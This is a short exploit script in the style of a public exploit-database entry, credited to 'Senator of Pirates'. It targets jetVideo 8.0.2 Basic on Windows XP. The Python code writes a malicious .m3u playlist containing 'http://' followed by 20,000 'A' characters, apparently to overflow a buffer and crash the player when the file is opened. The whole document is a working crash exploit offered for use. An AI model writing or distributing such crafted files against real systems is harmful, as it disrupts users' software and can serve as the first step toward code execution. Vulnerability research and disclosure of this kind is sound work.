# Exploit Title: [jetVideo Crash Exploit]
# Author: [Senator of Pirates]
# Email : [Senator.of.Pirates.team@gmail.com]
# Software Link: [http://www.jetaudio.com/download/jetvideo.html]
# Version: [8.0.2 Basic]
# Tested on: [Windows XP PS3 En]
header = "http://"
junk = "A" * 20000
payload = (header+junk)
f = open("Exploit.m3u","wb")
f.write(payload)
f.close()